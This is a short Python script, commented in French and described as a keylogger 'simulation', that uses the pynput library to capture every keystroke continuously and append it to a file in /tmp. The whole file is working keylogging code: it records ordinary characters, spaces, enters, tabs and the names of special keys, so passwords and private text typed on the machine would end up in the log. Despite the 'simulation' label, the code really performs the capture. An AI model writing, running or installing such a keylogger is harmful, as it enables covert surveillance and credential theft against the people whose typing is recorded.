"""
Script de simulation de Keylogger.
Capture toutes les frappes clavier de l'utilisateur (caractères, espaces, 
touches spéciales) et les enregistre dans /tmp/collecte_keys.txt.
Utilise la bibliothèque pynput pour écouter les événements du clavier en continu.
"""
import pynput
import sys
from pynput.keyboard import Key, KeyCode
def appuyer_touche(touche):
    try:
        with open("/tmp/collecte_keys.txt", "a") as f:
            if hasattr(touche, 'char') and touche.char:
                # Touche normale (a, b, 1, etc.)
                f.write(touche.char)
            elif touche == Key.space:
                f.write(" ")
            elif touche == Key.enter:
                f.write("\n")
            elif touche == Key.tab:
                f.write("\t")
            else:
                # Pour les touches spéciales
                f.write(f" [{touche.name if hasattr(touche, 'name') else str(touche)}] ")
    except Exception as e:
        print(f"Erreur: {e}")
try:
    with pynput.keyboard.Listener(on_press=appuyer_touche) as listener:
        listener.join()
except KeyboardInterrupt:
    print("\nInterruption du keylogger")
    sys.exit(0)
